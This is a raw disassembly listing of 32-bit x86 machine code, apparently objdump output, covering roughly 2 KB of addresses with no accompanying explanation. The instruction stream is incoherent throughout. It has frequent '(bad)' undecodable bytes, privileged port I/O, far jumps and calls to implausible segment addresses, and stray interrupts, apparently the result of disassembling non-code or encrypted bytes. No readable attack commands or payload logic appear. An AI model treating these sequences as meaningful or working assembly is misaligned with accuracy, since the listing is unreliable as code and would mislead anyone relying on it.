  421f64:	outs   dx,DWORD PTR ds:[esi]
  421f65:	call   0xfb9f:0x57890cb3
  421f6c:	and    eax,0xefee4905
  421f71:	and    al,0xc3
  421f73:	or     edx,DWORD PTR [eax]
  421f75:	mov    edi,DWORD PTR [edi-0x34780916]
  421f7b:	jae    0x421f6e
  421f7d:	mov    ecx,0x3facb46b
  421f82:	push   0xc77d0ac9
  421f87:	mov    ds:0xfac6ff83,eax
  421f8c:	or     eax,0x8c22398c
  421f91:	repnz dec esi
  421f93:	add    al,0xca
  421f95:	cld    
  421f96:	add    edi,DWORD PTR ds:0xf2b59dbd
  421f9c:	cdq    
  421f9d:	cmp    eax,0x50d8e5b9
  421fa2:	pusha  
  421fa3:	int    0x32
  421fa5:	sahf   
  421fa6:	xchg   edx,eax
  421fa7:	mov    ch,0x75
  421fa9:	sub    eax,0x3e69830a
  421fae:	loopne 0x421f99
  421fb0:	mov    al,0x9e
  421fb2:	push   cs
  421fb3:	popa   
  421fb4:	out    0x12,al
  421fb6:	xchg   edi,eax
  421fb7:	jle    0x421f64
  421fb9:	adc    eax,0x7207c7c
  421fbe:	test   ah,dl
  421fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fc1:	lahf   
  421fc2:	mov    ds:0x1a8db12,al
  421fc7:	out    0x2f,eax
  421fc9:	fnstsw WORD PTR [ebx+0x7a1ccf51]
  421fcf:	sbb    eax,0xbcc809da
  421fd4:	pushf  
  421fd5:	or     ch,cl
  421fd7:	sti    
  421fd8:	xchg   esi,eax
  421fd9:	push   cs
  421fda:	leave  
  421fdb:	inc    esp
  421fdc:	pop    esp
  421fdd:	loop   0x422051
  421fdf:	(bad)  
  421fe0:	aas    
  421fe1:	push   ebx
  421fe2:	or     BYTE PTR [eax],bh
  421fe4:	fcmovu st,st(7)
  421fe6:	fdiv   QWORD PTR [eax]
  421fe8:	fbstp  TBYTE PTR [eax-0x66d90465]
  421fee:	(bad)  
  421fef:	lock outs dx,WORD PTR ds:[esi]
  421ff2:	sti    
  421ff3:	mul    DWORD PTR [ebx+ebp*8+0x26]
  421ff7:	push   cs
  421ff8:	mov    al,0xbe
  421ffa:	xor    BYTE PTR ds:0xb1b7d4d8,0xa6
  422001:	stos   BYTE PTR es:[edi],al
  422002:	jmp    esp
  422004:	push   esi
  422005:	adc    al,0xc5
  422007:	outs   dx,DWORD PTR ds:[esi]
  422008:	cmp    ebx,edi
  42200a:	inc    esi
  42200b:	ret    0xa5e5
  42200e:	inc    eax
  42200f:	jae    0x42200f
  422011:	pop    edx
  422012:	sub    eax,0xa89d32a2
  422017:	js     0x421fab
  422019:	adc    BYTE PTR [ecx+eax*4-0x5],al
  42201d:	fsub   st,st(6)
  42201f:	cs out 0xb,al
  422022:	ror    BYTE PTR [ecx],cl
  422024:	sar    ecx,1
  422026:	sbb    ebp,DWORD PTR [edx-0x12]
  422029:	data16 cs jge 0x4220a0
  42202d:	mov    ds:0xe30badf9,eax
  422032:	cmc    
  422033:	sbb    al,0xa
  422035:	jne    0x422019
  422037:	inc    edi
  422038:	adc    ch,BYTE PTR [ecx+0x745372bd]
  42203e:	outs   dx,DWORD PTR ds:[esi]
  42203f:	jae    0x421fef
  422041:	sub    bl,BYTE PTR [edi-0x2d]
  422044:	retf   
  422045:	call   0x959:0x34572e7f
  42204c:	lods   eax,DWORD PTR ds:[esi]
  42204d:	mov    ah,0x71
  42204f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422050:	xlat   BYTE PTR ds:[ebx]
  422051:	xrelease xchg DWORD PTR [ebx+eax*4+0x2a152e32],esi
  422059:	mov    esi,0x257fb878
  42205e:	cs scas eax,DWORD PTR es:[edi]
  422060:	add    DWORD PTR [ebx],esp
  422062:	add    eax,0x1c894135
  422067:	fistp  QWORD PTR [edx+0x3736240a]
  42206d:	(bad)
  422070:	outs   dx,BYTE PTR ds:[esi]
  422071:	lods   eax,DWORD PTR ds:[esi]
  422072:	jmp    0x78b35a8
  422077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422078:	mov    esi,ebx
  42207a:	jae    0x422028
  42207c:	or     edx,0xfffffffd
  42207f:	(bad)  
  422080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422081:	das    
  422082:	xor    edi,ebx
  422084:	and    bh,BYTE PTR [ebp+0x1d]
  422087:	stos   DWORD PTR es:[edi],eax
  422088:	scas   al,BYTE PTR es:[edi]
  422089:	and    ebp,DWORD PTR [esp+eiz*4+0x14]
  42208d:	lahf   
  42208e:	ins    DWORD PTR es:[edi],dx
  42208f:	inc    ebp
  422090:	sub    al,0x65
  422092:	fidiv  DWORD PTR [ebx]
  422094:	ret    
  422095:	pop    es
  422096:	call   0x8486:0x8b9b2b32
  42209d:	dec    esp
  42209e:	jg     0x422091
  4220a0:	pop    es
  4220a1:	sub    BYTE PTR [edi+eax*8+0x324d263c],bl
  4220a8:	lds    eax,FWORD PTR [ebp-0x2140b687]
  4220ae:	mov    bl,0x5b
  4220b0:	adc    BYTE PTR [ecx],ch
  4220b2:	shl    BYTE PTR [eax],0xef
  4220b5:	stos   BYTE PTR es:[edi],al
  4220b6:	sbb    eax,0xb0e876b3
  4220bb:	ss xor al,0x1f
  4220be:	imul   esp,DWORD PTR [ebp+0x855ab7b],0xfffffff5
  4220c5:	sbb    edi,DWORD PTR [edi]
  4220c7:	lock clc 
  4220c9:	stc    
  4220ca:	mov    eax,0xefa5672e
  4220cf:	ds daa 
  4220d1:	call   0x3e00b4ad
  4220d6:	leave  
  4220d7:	or     BYTE PTR [ecx+0x16],dl
  4220da:	daa    
  4220db:	add    edi,DWORD PTR gs:[edx+ebp*8+0xe0eb6a1]
  4220e3:	in     al,0x21
  4220e5:	(bad)  
  4220e6:	les    esi,FWORD PTR [ebx]
  4220e8:	sti    
  4220e9:	jl     0x42212d
  4220eb:	push   cs
  4220ec:	dec    ebx
  4220ed:	xchg   ebx,eax
  4220ee:	and    al,0x74
  4220f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220f1:	dec    ecx
  4220f2:	xchg   edi,eax
  4220f3:	jge    0x4220d9
  4220f5:	push   esi
  4220f6:	jne    0x42210f
  4220f8:	xchg   edi,eax
  4220f9:	jne    0x422103
  4220fb:	(bad)  
  4220fc:	cmc    
  4220fd:	mov    bh,0xd1
  4220ff:	clc    
  422100:	add    al,0x85
  422102:	fbld   TBYTE PTR [esi-0x1698b8c1]
  422108:	(bad)  
  422109:	test   eax,0xf4962f28
  42210e:	jecxz  0x42211d
  422110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422111:	pop    es
  422112:	and    bl,bl
  422114:	mov    esp,0x5630b036
  422119:	dec    esi
  42211a:	jnp    0x4220cb
  42211c:	sub    DWORD PTR [ebx],eax
  42211e:	bound  ebx,QWORD PTR [ecx+0x6c85274b]
  422124:	pop    ds
  422125:	jne    0x42219f
  422127:	mov    ebp,0x8a3cae8f
  42212c:	les    ebp,FWORD PTR [edi-0x5dc909a1]
  422132:	mov    BYTE PTR [ecx+0x5a],dh
  422135:	xchg   esp,eax
  422136:	fdiv   QWORD PTR [edi+0x3b50e6d0]
  42213c:	xor    BYTE PTR [edi],bl
  42213e:	imul   BYTE PTR [ebx+ebp*8]
  422141:	sbb    DWORD PTR [ebp-0x5e5440c3],0xffffffd1
  422148:	test   eax,0x8ad006ea
  42214d:	xor    DWORD PTR [ebx+0x3f],0xc4fb4034
  422154:	mov    ebx,0xdd9eb5c
  422159:	pop    edx
  42215a:	xchg   ecx,eax
  42215b:	test   BYTE PTR [esi],ch
  42215d:	sub    DWORD PTR ds:0x3a8b33e0,ebp
  422163:	int3   
  422164:	je     0x42216a
  422166:	ror    BYTE PTR [edx+0x52d71043],0xf9
  42216d:	cmp    BYTE PTR [ebp+0x69],cl
  422170:	sahf   
  422171:	scas   eax,DWORD PTR es:[edi]
  422172:	ret    
  422173:	clc    
  422174:	push   ebp
  422175:	dec    ecx
  422176:	cmc    
  422177:	lds    ebx,FWORD PTR [ebx+edi*8]
  42217a:	in     eax,0x89
  42217c:	ins    DWORD PTR es:[edi],dx
  42217d:	scas   eax,DWORD PTR es:[edi]
  42217e:	push   esp
  42217f:	gs arpl sp,di
  422182:	cld    
  422183:	adc    cl,BYTE PTR gs:[edx]
  422186:	adc    eax,0x2c1356ab
  42218b:	scas   al,BYTE PTR es:[edi]
  42218c:	add    DWORD PTR [edx+0x7cb6b8ec],esi
  422192:	cwde   
  422193:	mov    eax,ds:0x181e8aae
  422198:	icebp  
  422199:	sbb    DWORD PTR [esi+0x7259e5b1],edx
  42219f:	push   ss
  4221a0:	and    esp,DWORD PTR [eax-0x24]
  4221a3:	aaa    
  4221a4:	shl    ch,0xe5
  4221a7:	push   ds
  4221a8:	mov    cl,0xc0
  4221aa:	daa    
  4221ab:	mov    eax,ds:0xcb8e7e39
  4221b0:	scas   al,BYTE PTR es:[edi]
  4221b1:	leave  
  4221b2:	sub    DWORD PTR [ebx+0x739d9b66],edi
  4221b8:	not    BYTE PTR [edx]
  4221ba:	add    BYTE PTR ds:0x4ce51735,0x8
  4221c1:	and    eax,0x823aecf
  4221c6:	rol    BYTE PTR [ebp-0x56cbe359],1
  4221cc:	cmp    BYTE PTR ds:0xb8147cf7,dl
  4221d2:	and    BYTE PTR [ecx-0x42],ah
  4221d5:	outs   dx,DWORD PTR ds:[esi]
  4221d6:	retf   0x2260
  4221d9:	lds    edx,FWORD PTR [esp+eiz*2-0x392b90b3]
  4221e0:	aas    
  4221e1:	popa   
  4221e2:	add    edi,DWORD PTR [ebx-0xb]
  4221e5:	pop    es
  4221e6:	cmp    bh,cl
  4221e8:	sub    DWORD PTR [eax+0x63],eax
  4221eb:	xor    BYTE PTR [ebx+0x2f647c16],bl
  4221f1:	sahf   
  4221f2:	outs   dx,DWORD PTR ds:[esi]
  4221f3:	fcom   QWORD PTR [eax-0x7a1ee74b]
  4221f9:	mov    ch,0xf7
  4221fb:	xchg   ecx,eax
  4221fc:	add    ebx,DWORD PTR [ebp+0x680150f8]
  422202:	cbw    
  422204:	js     0x42226b
  422206:	push   0xffffffb0
  422208:	or     cl,bh
  42220a:	xor    DWORD PTR [eax-0x35],ebx
  42220d:	or     al,0xfb
  42220f:	minps  xmm1,XMMWORD PTR [ecx+esi*2+0x65]
  422214:	mov    dh,0x5d
  422216:	pop    ebp
  422217:	inc    edi
  422218:	outs   dx,DWORD PTR ds:[esi]
  422219:	pop    es
  42221a:	mov    ds,WORD PTR [edi-0x24d41756]
  422220:	addr16 ja 0x422268
  422223:	outs   dx,BYTE PTR ds:[esi]
  422224:	cdq    
  422225:	dec    ebx
  422226:	into   
  422227:	test   al,0xa0
  422229:	sub    eax,0xc90776c
  42222e:	sahf   
  42222f:	cmp    al,0x50
  422231:	stc    
  422232:	mov    bl,0x5e
  422234:	cmp    eax,0xa52dd94f
  422239:	aas    
  42223a:	loope  0x422241
  42223c:	mov    ch,0xa2
  42223e:	jae    0x4221c2
  422240:	inc    ebp
  422241:	stos   DWORD PTR es:[edi],eax
  422242:	addr16 ret 
  422244:	sub    BYTE PTR [ecx+0x67d0027b],cl
  42224a:	stc    
  42224b:	cdq    
  42224c:	mov    ecx,0xfc9c961b
  422251:	mov    eax,0x7f0fadbb
  422256:	jmp    0x2cf41873
  42225b:	push   ebp
  42225c:	inc    ebx
  42225d:	and    ebx,DWORD PTR [edi-0x53e02274]
  422263:	ja     0x422249
  422265:	adc    BYTE PTR [ecx-0x66],cl
  422268:	fsub   QWORD PTR [edx+edx*2+0x658adbfd]
  42226f:	out    dx,al
  422270:	push   0xffffffcd
  422272:	fbstp  TBYTE PTR [ebp+0x1e58391c]
  422278:	sbb    cl,BYTE PTR [ebx+edi*1]
  42227b:	loop   0x4222d8
  42227d:	jp     0x42221a
  42227f:	sbb    dh,dh
  422281:	push   eax
  422282:	pop    ebp
  422283:	mov    esi,0xa6bdc743
  422288:	lds    ebx,FWORD PTR [edi+0x396f082b]
  42228e:	popa   
  42228f:	and    ebx,ebx
  422291:	jmp    0x8bf0:0xcdee62bf
  422298:	aam    0x49
  42229a:	addr16 inc esp
  42229c:	and    al,ah
  42229e:	push   es
  42229f:	mov    bh,0xf3
  4222a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222a2:	pop    edx
  4222a3:	xor    DWORD PTR [eax+0x7b4e0be4],esp
  4222a9:	jne    0x4222b6
  4222ab:	inc    edx
  4222ac:	repz push eax
  4222ae:	stos   DWORD PTR es:[edi],eax
  4222af:	jmp    0xf0f22b75
  4222b4:	jp     0x4222cb
  4222b6:	(bad)  
  4222b7:	enter  0x41f2,0x90
  4222bb:	call   0x77b0:0xafa25
  4222c2:	jae    0x422319
  4222c4:	and    ch,BYTE PTR [eax-0x7e]
  4222c7:	lods   al,BYTE PTR ds:[esi]
  4222c8:	cli    
  4222c9:	fsub   st(1),st
  4222cb:	sub    ebp,edx
  4222cd:	ror    bl,1
  4222cf:	mov    bh,0x75
  4222d1:	nop
  4222d2:	int3   
  4222d3:	inc    ebp
  4222d4:	lods   al,BYTE PTR ds:[esi]
  4222d5:	ds pop ds
  4222d7:	bound  ecx,QWORD PTR [ebp-0x7e6fcbe3]
  4222dd:	inc    esp
  4222de:	pushf  
  4222df:	mov    al,dh
  4222e1:	and    eax,0xa4cc005f
  4222e6:	add    dl,BYTE PTR [esi]
  4222e8:	inc    dl
  4222ea:	mov    ecx,0x4662f542
  4222ef:	mov    ebp,0x98680fcb
  4222f4:	xchg   ebx,eax
  4222f5:	or     BYTE PTR [ecx],cl
  4222f7:	data16 icebp 
  4222f9:	das    
  4222fa:	mov    ah,0x71
  4222fc:	inc    ebx
  4222fd:	fsub   st,st(3)
  4222ff:	repz jp 0x4222e6
  422302:	iret   
  422303:	fdiv   QWORD PTR [edi+eiz*1-0x7c]
  422307:	je     0x422326
  422309:	cdq    
  42230a:	mov    al,ds:0xf53afd0e
  42230f:	adc    esi,ecx
  422311:	ret    
  422312:	and    dh,al
  422314:	jle    0x422328
  422316:	(bad)  
  422317:	jo     0x42234f
  422319:	lahf   
  42231a:	int    0x48
  42231c:	jge    0x422350
  42231e:	xchg   DWORD PTR [esi-0x7caaebec],edx
  422324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422325:	mov    DWORD PTR [eax+0x37],ebx
  422328:	or     dl,BYTE PTR [ecx+edi*4-0x2246cd6a]
  42232f:	call   0xb5ad:0x5ad99b68
  422336:	dec    ebx
  422337:	call   FWORD PTR [edx]
  422339:	xchg   ebp,eax
  42233a:	mov    ebx,0xe6498ece
  42233f:	xchg   ecx,eax
  422340:	int    0xc0
  422342:	into   
  422343:	adc    al,0xb1
  422345:	or     DWORD PTR [ebx-0x47254d61],esp
  42234b:	imul   ebx,DWORD PTR [ebp-0x3a028b5c],0xffffff8d
  422352:	add    esi,ecx
  422354:	leave  
  422355:	add    dh,BYTE PTR [ebx]
  422357:	xchg   esp,eax
  422358:	push   edx
  422359:	retf   
  42235a:	or     edi,DWORD PTR [edi+0x487d247f]
  422360:	or     ebx,ebx
  422362:	mov    ds:0xd5578b28,al
  422367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422368:	stos   BYTE PTR es:[edi],al
  422369:	jmp    0x4223e4
  42236b:	dec    esp
  42236c:	inc    ebp
  42236d:	pop    ebx
  42236e:	test   eax,0xc15f810d
  422373:	mov    edx,0x18d80370
  422378:	(bad)  
  422379:	in     al,dx
  42237a:	dec    ecx
  42237b:	mul    BYTE PTR ds:0xef2bfecc
  422381:	imul   ebp,DWORD PTR [edx],0xffffffe0
  422384:	(bad)  [edx+0x40]
  422387:	mov    BYTE PTR [esi],ah
  422389:	loopne 0x4223bc
  42238b:	xor    esp,edi
  42238d:	sbb    DWORD PTR ds:0x7bbf6eaa,esp
  422393:	push   es
  422394:	and    bh,ah
  422396:	push   ds
  422397:	mov    edi,ebx
  422399:	fisttp WORD PTR [esi-0xc03c388]
  42239f:	mov    ecx,0x46b6146d
  4223a4:	pop    ebp
  4223a5:	inc    esi
  4223a6:	push   esi
  4223a7:	mov    ah,0xba
  4223a9:	xchg   esi,eax
  4223aa:	mov    edi,0x21c4a8b3
  4223af:	out    0x85,eax
  4223b1:	aaa    
  4223b2:	pop    ecx
  4223b3:	inc    edi
  4223b4:	popf   
  4223b5:	scas   al,BYTE PTR es:[edi]
  4223b6:	and    bl,dh
  4223b8:	xchg   DWORD PTR es:[ecx-0x3936a321],edi
  4223bf:	add    al,BYTE PTR [edi]
  4223c1:	hlt    
  4223c2:	cs jne 0x422361
  4223c5:	pop    eax
  4223c6:	xchg   DWORD PTR [eax+0x65],edx
  4223c9:	adc    BYTE PTR [ebx-0x29e6c484],ch
  4223cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223d0:	sbb    eax,0x9398b864
  4223d5:	mov    edi,0x6d33081
  4223da:	jns    0x422414
  4223dc:	fldcw  WORD PTR ss:[edi]
  4223df:	and    bl,BYTE PTR [esi+0x453fd67f]
  4223e5:	or     edi,esp
  4223e7:	inc    esp
  4223e8:	xor    bh,bh
  4223ea:	stos   BYTE PTR es:[edi],al
  4223eb:	pmuludq mm0,QWORD PTR [ebx-0x1f48559e]
  4223f2:	ds jno 0x42246c
  4223f5:	lea    edi,ds:0x1cbe487a
  4223fb:	jo     0x422430
  4223fd:	xchg   edi,eax
  4223fe:	jg     0x422436
  422400:	or     eax,0x5340698e
  422405:	pop    edx
  422406:	sub    edx,edi
  422408:	dec    ebp
  422409:	or     al,0xb
  42240b:	hlt    
  42240c:	das    
  42240d:	neg    BYTE PTR [ecx+0x10901d61]
  422413:	mov    DWORD PTR [ebx],edx
  422415:	mov    cl,0xfe
  422417:	pop    ds
  422418:	imul   eax,ecx,0x86ecd974
  42241e:	out    dx,al
  42241f:	(bad)  
  422420:	xor    eax,0xe19934eb
  422425:	adc    eax,0x266b5e80
  42242a:	cld    
  42242b:	stos   BYTE PTR es:[edi],al
  42242c:	push   ebx
  42242d:	or     eax,0x7f37892c
  422432:	or     eax,0xf227224
  422437:	out    dx,al
  422438:	in     eax,dx
  422439:	pop    esi
  42243a:	jge    0x422483
  42243c:	bnd jp 0x4223e8
  42243f:	mov    esi,0x5014c9bf
  422444:	es not al
  422447:	lock mul DWORD PTR [ebx-0x43]
  42244b:	je     0x422494
  42244d:	xchg   ebp,eax
  42244e:	push   0xd7bf0a2b
  422453:	adc    DWORD PTR [ebx-0x6eeee029],ecx
  422459:	call   0x538f:0xc332ed8d
  422460:	and    BYTE PTR ds:0xed193da3,cl
  422466:	or     DWORD PTR [edi],esi
  422468:	dec    eax
  422469:	fild   DWORD PTR [ebp+0x1]
  42246c:	xchg   edi,eax
  42246d:	xchg   esp,eax
  42246e:	mov    ebx,0x82b58679
  422473:	cmp    al,0xd9
  422475:	clc    
  422476:	mov    esp,0xf75ba463
  42247b:	les    ebx,FWORD PTR [esi-0x69e5f54f]
  422481:	push   cs
  422482:	pop    ebp
  422483:	test   eax,0x1068e6fa
  422488:	aam    0x77
  42248a:	sub    dh,BYTE PTR [edi+esi*1]
  42248d:	add    esi,DWORD PTR [esi+0x6757f08d]
  422493:	dec    eax
  422494:	ss aad 0xad
  422497:	(bad)  [edx+0x316fce52]
  42249d:	jg     0x4224d0
  42249f:	out    0x61,al
  4224a1:	gs jnp 0x422510
  4224a4:	mov    esi,0x868f35e5
  4224a9:	mov    esp,0x9fe9e98
  4224ae:	ins    DWORD PTR es:[edi],dx
  4224af:	int3   
  4224b0:	retf   
  4224b1:	and    al,0xf6
  4224b3:	mov    ecx,0x613a8fbe
  4224b8:	and    al,ch
  4224ba:	ins    DWORD PTR es:[edi],dx
  4224bb:	xor    BYTE PTR [ebx-0x2037dd87],al
  4224c1:	cs push edx
  4224c3:	scas   eax,DWORD PTR es:[edi]
  4224c4:	frstor [ebx+0x435d89e8]
  4224ca:	fnsave [ebp-0x1e]
  4224cd:	pop    es
  4224ce:	cmpxchg ebx,edi
  4224d1:	jae    0x422504
  4224d3:	xchg   ebx,eax
  4224d4:	pop    edi
  4224d5:	mov    ds:0xbd6a790b,al
  4224da:	test   DWORD PTR [edx],edi
  4224dc:	pusha  
  4224dd:	xlat   BYTE PTR ds:[ebx]
  4224de:	aaa    
  4224df:	(bad)  [ebp+edx*4-0x7f]
  4224e3:	mov    ds,WORD PTR [edx]
  4224e5:	cmove  ecx,DWORD PTR [bx+si-0x10]
  4224ea:	xchg   edi,eax
  4224eb:	cmp    eax,0x5b8890f
  4224f0:	xchg   edx,eax
  4224f1:	test   DWORD PTR [ebx+0x40],eax
  4224f4:	adc    BYTE PTR [edx-0x604a0aab],ch
  4224fa:	pop    esi
  4224fb:	jmp    0x3eafd9d5
  422500:	aad    0x36
  422502:	out    dx,al
  422503:	jbe    0x422521
  422505:	xchg   edx,eax
  422506:	add    DWORD PTR [edi],eax
  422508:	or     DWORD PTR [esi+0x1c510a08],0x51
  42250f:	shr    DWORD PTR ds:0xb1b3ec1a,1
  422515:	xchg   ebx,eax
  422516:	pop    ebp
  422517:	dec    ecx
  422518:	jmp    0xc4cc:0xaae82a26
  42251f:	xchg   edx,eax
  422520:	push   ebx
  422521:	sub    al,0x11
  422523:	in     al,0x51
  422525:	mov    edx,0x462a38ba
  42252a:	fstp   QWORD PTR [edx]
  42252c:	cmp    ah,BYTE PTR [edi]
  42252e:	cld    
  42252f:	es (bad) 
  422531:	ins    BYTE PTR es:[edi],dx
  422532:	dec    esp
  422533:	stc    
  422534:	out    dx,al
  422535:	inc    eax
  422536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422537:	xchg   edx,eax
  422538:	push   edx
  422539:	add    al,0x4f
  42253b:	jo     0x42254a
  42253d:	sbb    BYTE PTR [edi-0x1d615c76],cl
  422543:	cmc    
  422544:	xor    ebx,ebp
  422546:	add    al,0x5a
  422548:	or     ebx,DWORD PTR cs:[edx-0x21]
  42254c:	out    dx,al
  42254d:	xchg   ebx,eax
  42254e:	aaa    
  42254f:	mov    DWORD PTR [ebp+0x68],eax
  422552:	pusha  
  422553:	loopne 0x42251a
  422555:	mov    ds:0xaa64cc98,al
  42255a:	in     al,dx
  42255b:	xchg   ebx,eax
  42255c:	shl    BYTE PTR ss:[edi+eiz*2-0x31],cl
  422561:	mov    WORD PTR [ecx-0x4a75d61f],?
  422567:	add    BYTE PTR [edx],ah
  422569:	(bad)  
  42256a:	xor    dl,al
  42256c:	mov    bh,0x2f
  42256e:	xchg   esi,eax
  42256f:	jne    0x42258d
  422571:	mov    cl,dh
  422573:	mov    ?,WORD PTR [esi-0x3032d806]
  422579:	jbe    0x42250d
  42257b:	gs mov edi,0x591fc663
  422581:	sti    
  422582:	or     bl,BYTE PTR [edx+0xeb53ea9]
  422588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422589:	or     al,BYTE PTR [edx+0x3d455e70]
  42258f:	cmp    ah,BYTE PTR [ecx-0x78]
  422592:	sub    ebp,DWORD PTR [eax+0x1b0836c1]
  422598:	add    al,BYTE PTR [eax-0x14]
  42259b:	cmp    ebx,0xd17cdbcd
  4225a1:	jmp    0xe343:0xc24d0ff8
  4225a8:	fst    QWORD PTR [edx+0x51]
  4225ab:	sbb    DWORD PTR [ecx],edi
  4225ad:	or     eax,0x24466521
  4225b2:	push   esi
  4225b3:	mov    al,ds:0x33a9fa0b
  4225b8:	sbb    BYTE PTR [esi+0x5ab35877],ch
  4225be:	js     0x4225e6
  4225c0:	test   dh,cl
  4225c2:	dec    eax
  4225c3:	inc    ecx
  4225c4:	mov    bl,BYTE PTR [edx-0x1980386f]
  4225ca:	sub    eax,0x48e013bd
  4225cf:	pop    edi
  4225d0:	and    BYTE PTR [eax+edx*4-0x31ac9946],cl
  4225d7:	dec    ebx
  4225d8:	add    BYTE PTR [edx-0x14],ah
  4225db:	push   esp
  4225dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225dd:	cmc    
  4225de:	add    al,0x86
  4225e0:	sub    al,dl
  4225e2:	cdq    
  4225e3:	jle    0x422566
  4225e5:	pop    ds
  4225e6:	fwait
  4225e7:	sub    al,BYTE PTR [eax+0x58a8679]
  4225ed:	data16 mov al,0xd1
  4225f0:	rcr    DWORD PTR ds:0x83cd490f,cl
  4225f6:	sbb    ebp,0xffffffb4
  4225f9:	sub    al,0xfd
  4225fb:	or     edi,DWORD PTR [ecx]
  4225fd:	mov    eax,ds:0xa88d8510
  422602:	bound  esi,QWORD PTR ds:0x848e2909
  422608:	in     eax,0x68
  42260a:	cmc    
  42260b:	fld    QWORD PTR [edi]
  42260d:	mov    ecx,0xa9f181b9
  422612:	cli    
  422613:	mov    ds:0x715313bd,eax
  422618:	ds pushf 
  42261a:	lock mov edi,0x14dc3cdc
  422620:	ret    
  422621:	pop    edx
  422622:	iret   
  422623:	js     0x4225ef
  422625:	or     eax,0xfc60e875
  42262a:	pushf  
  42262b:	in     al,dx
  42262c:	fiadd  WORD PTR [ebx-0x67]
  42262f:	xchg   ebx,eax
  422630:	jbe    0x42265c
  422632:	jecxz  0x422694
  422634:	adc    BYTE PTR [ecx*8-0x741844a],ah
  42263b:	xchg   edx,eax
  42263c:	std    
  42263d:	loope  0x42264d
  42263f:	stos   DWORD PTR es:[edi],eax
  422640:	lock fadd DWORD PTR [ebx+0x42d4efb4]
  422647:	sar    DWORD PTR [edx],cl
  422649:	scas   al,BYTE PTR es:[edi]
  42264a:	pop    es
  42264b:	or     BYTE PTR [ecx],bl
  42264d:	push   ebx
  42264e:	pop    edi
  42264f:	js     0x42264f
  422651:	lods   eax,DWORD PTR ds:[esi]
  422652:	dec    ebp
  422653:	mov    cl,0x2d
  422655:	pop    edi
  422656:	jle    0x42262a
  422658:	xchg   ecx,eax
  422659:	inc    ebp
  42265a:	cmp    eax,0xc8f82c6f
  42265f:	ret    
  422660:	mov    ah,0xde
  422662:	mov    WORD PTR [ebx+0x6f72a28c],gs
  422668:	pop    ss
  422669:	cs aaa 
  42266b:	rcl    BYTE PTR [eax],0xe6
  42266e:	mov    ah,0x75
  422670:	mov    dl,bh
  422672:	jns    0x422647
  422674:	mov    esi,0x1a23009f
  422679:	adc    BYTE PTR [edx+0x6006a52d],dl
  42267f:	pusha  
  422680:	sub    DWORD PTR [edi+0x7d],eax
  422683:	fstp   DWORD PTR [esi]
  422685:	in     al,dx
  422686:	mov    ecx,0x6d62f199
  42268b:	outs   dx,DWORD PTR ds:[esi]
  42268c:	lock jl 0x422620
  42268f:	nop
  422690:	int3   
  422691:	gs jmp 0x422671
  422694:	popa   
  422695:	leave  
  422696:	mov    ecx,0x8898543c
  42269b:	xor    BYTE PTR [ebx-0x11],al
  42269e:	ret    0x5472
  4226a1:	rcl    esi,0x37
  4226a4:	xor    al,0x63
  4226a6:	mov    ebp,0x25d7fcb5
  4226ab:	dec    ebx
  4226ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ad:	dec    eax
  4226ae:	inc    esp
  4226af:	xchg   edx,eax
  4226b0:	pushf  
  4226b1:	push   ss
  4226b2:	mov    edx,0xcc1fbe1f
  4226b7:	dec    edx
  4226b8:	int3   
  4226b9:	call   0x49ef:0xa1290c9e
  4226c0:	lea    esi,[edi+ebp*4-0x37]
  4226c4:	inc    ecx
  4226c5:	add    eax,0x384f6fb7
  4226ca:	ret    0xc6ec
  4226cd:	je     0x4226cb
  4226cf:	push   0x1b
  4226d1:	cld    
  4226d2:	xchg   edx,eax
  4226d3:	repz mov ah,0xa7
  4226d6:	ret    0x46bd
  4226d9:	mov    ecx,0x959afd6c
  4226de:	pusha  
  4226df:	pusha  
  4226e0:	mov    BYTE PTR [eax],dl
  4226e2:	sbb    eax,0xdd0e6d79
  4226e7:	and    eax,0xba53b6bc
  4226ec:	(bad)  
  4226ed:	fild   DWORD PTR [edi]
  4226ef:	(bad)  
  4226f0:	mov    ?,WORD PTR [ecx-0x4d]
  4226f3:	adc    dl,0x0
  4226f6:	popf   
  4226f7:	sbb    al,0x59
  4226f9:	aam    0xe
  4226fb:	stos   DWORD PTR es:[edi],eax
  4226fc:	imul   ebx,DWORD PTR [ebp-0x31],0xee70a6a7
  422703:	jmp    0xb0dd:0xdd8ab815
  42270a:	test   al,0x88
  42270c:	jmp    0x4226c8
  42270e:	push   ebp
  42270f:	mov    bh,0x7c
  422711:	cmp    bh,dh
  422713:	jecxz  0x4226cf
  422715:	add    esi,edi
  422717:	hlt    
  422718:	mov    ds:0x3f1f8527,eax
  42271d:	imul   eax,DWORD PTR [ecx-0x279a8719],0x84e5865
  422727:	xlat   BYTE PTR ds:[ebx]
  422728:	mov    ecx,ds
  42272a:	xor    edi,DWORD PTR [edi+0x203b449a]
  422730:	sbb    al,0x51
  422732:	mov    edx,ebx
  422734:	adc    BYTE PTR ds:0xf774814b,bl
  42273a:	leave  
  42273b:	cwde   
  42273c:	out    0x59,al
  42273e:	sub    BYTE PTR [esi],ah
  422740:	scas   al,BYTE PTR es:[edi]
  422741:	(bad)  
  422742:	test   al,0x6c
  422744:	jne    0x4226cb
  422746:	cmp    ah,BYTE PTR [ebx]
  422748:	ret    0xbdf4
  42274b:	ror    BYTE PTR [edx-0x69],1
  42274e:	cld    
  42274f:	pushf  
  422750:	push   es
  422751:	dec    ecx
  422752:	loopne 0x4227b1
  422754:	and    BYTE PTR [edi+esi*8+0x6c],bh
  422758:	jbe    0x422737
  42275a:	stos   BYTE PTR es:[edi],al
  42275b:	cmp    DWORD PTR [esi+ebx*4],esi
  42275e:	pop    eax
  42275f:	dec    esp
  422760:	mov    cl,0xa7
  422762:	adc    bh,al
  422764:	aas    
